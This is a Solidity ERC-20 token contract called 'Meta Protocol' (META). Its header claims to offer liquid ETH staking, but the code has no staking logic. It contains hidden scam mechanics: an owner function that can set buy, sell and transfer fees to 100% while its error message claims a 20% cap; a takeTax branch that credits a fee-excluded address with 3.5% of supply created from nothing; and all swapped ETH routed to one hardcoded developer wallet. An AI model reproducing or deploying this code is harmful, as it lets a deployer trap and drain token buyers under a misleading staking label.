// SPDX-License-Identifier: MIT

/*
Stake ETH with Meta Pool. Receive a liquid token to simultaneously accrue staking rewards and unlock liquidity to participate in DeFi activities

Website: https://www.metaprotocol.info
*/

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IuniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address swapPair);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

contract META is IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1000000000 * (10 ** _decimals);

    string private constant _name = unicode"Meta Protocol";
    string private constant _symbol = unicode"META";

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFee;

    IUniswapRouter swapRouter;
    address public swapPair;
    bool private tradingEnabled = false;
    bool private swapEnabled = true;
    uint256 private swapTaxTimes;
    bool private inSwap;
    uint256 swapTaxAt;

    uint256 private divLP = 0;
    uint256 private divMarketing = 0;
    uint256 private divDev = 100;
    uint256 private divBurn = 0;
    
    uint256 private buyFee = 1300;
    uint256 private sellFee = 1300;
    uint256 private transferFee = 1300;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    address internal addDev = 0x1722aad461c4B949D7c4A8654F94aAa15831643A; 
    address internal addMarketing = 0x1722aad461c4B949D7c4A8654F94aAa15831643A;
    address internal addLp = 0x1722aad461c4B949D7c4A8654F94aAa15831643A;

    uint256 public maxTxAmount = ( _totalSupply * 350 ) / 10000;
    uint256 public maxSellAmount = ( _totalSupply * 350 ) / 10000;
    uint256 public maxWalletAmount = ( _totalSupply * 350 ) / 10000;
    uint256 private swappingThreshold = ( _totalSupply * 1000 ) / 100000;
    uint256 private minTaxTokensToSwap = ( _totalSupply * 10 ) / 100000;
    modifier lockTaxSwap {inSwap = true; _; inSwap = false;}

    constructor() Ownable(msg.sender) {
        IUniswapRouter _router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IuniswapFactory(_router.factory()).createPair(address(this), _router.WETH());
        swapRouter = _router; swapPair = _pair;
        isExcludedFee[addMarketing] = true;
        isExcludedFee[addDev] = true;
        isExcludedFee[addLp] = true;
        isExcludedFee[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function startTrading() external onlyOwner {tradingEnabled = true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(swapRouter), tokenAmount);
        swapRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            addLp,
            block.timestamp);
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        divLP = _liquidity; divMarketing = _marketing; divBurn = _burn; divDev = _development; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }

    function swapLiquidifyAndBurn(uint256 tokens) private lockTaxSwap {
        uint256 _denominator = (divLP.add(1).add(divMarketing).add(divDev)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(divLP).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(divLP));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(divLP);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(divMarketing);
        if(marketingAmt > 0){payable(addMarketing).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(addDev).transfer(contractBalance);}
    }

    function takeTax(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludedFee[recipient]) {return maxTxAmount;}
        if(getTotalTax(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalTax(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(divBurn > uint256(0) && getTotalTax(sender, recipient) > divBurn){_transfer(address(this), address(DEAD), amount.div(denominator).mul(divBurn));}
        return amount.sub(feeAmount);} return amount;
    }
    function getTotalTax(address sender, address recipient) internal view returns (uint256) {
        if(recipient == swapPair){return sellFee;}
        if(sender == swapPair){return buyFee;}
        return transferFee;
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
        maxTxAmount = newTx; maxSellAmount = newTransfer; maxWalletAmount = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function shouldSwapTokens(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minTaxTokensToSwap;
        bool aboveThreshold = balanceOf(address(this)) >= swappingThreshold;
        return !inSwap && swapEnabled && tradingEnabled && aboveMin && !isExcludedFee[sender] && recipient == swapPair && swapTaxTimes >= swapTaxAt && aboveThreshold;
    }

    function checkIfExcluded(address sender, address recipient) internal view returns (bool) {
        return !isExcludedFee[sender] && !isExcludedFee[recipient];
    }    

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludedFee[sender] && !isExcludedFee[recipient]){require(tradingEnabled, "tradingEnabled");}
        if(!isExcludedFee[sender] && !isExcludedFee[recipient] && recipient != address(swapPair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxWalletAmount, "Exceeds maximum wallet amount.");}
        if(sender != swapPair){require(amount <= maxSellAmount || isExcludedFee[sender] || isExcludedFee[recipient], "TX Limit Exceeded");}
        require(amount <= maxTxAmount || isExcludedFee[sender] || isExcludedFee[recipient], "TX Limit Exceeded"); 
        if(recipient == swapPair && !isExcludedFee[sender]){swapTaxTimes += uint256(1);}
        if(shouldSwapTokens(sender, recipient, amount)){swapLiquidifyAndBurn(swappingThreshold); swapTaxTimes = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcludedFee[sender] ? takeTax(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();
        _approve(address(this), address(swapRouter), tokenAmount);
        swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
}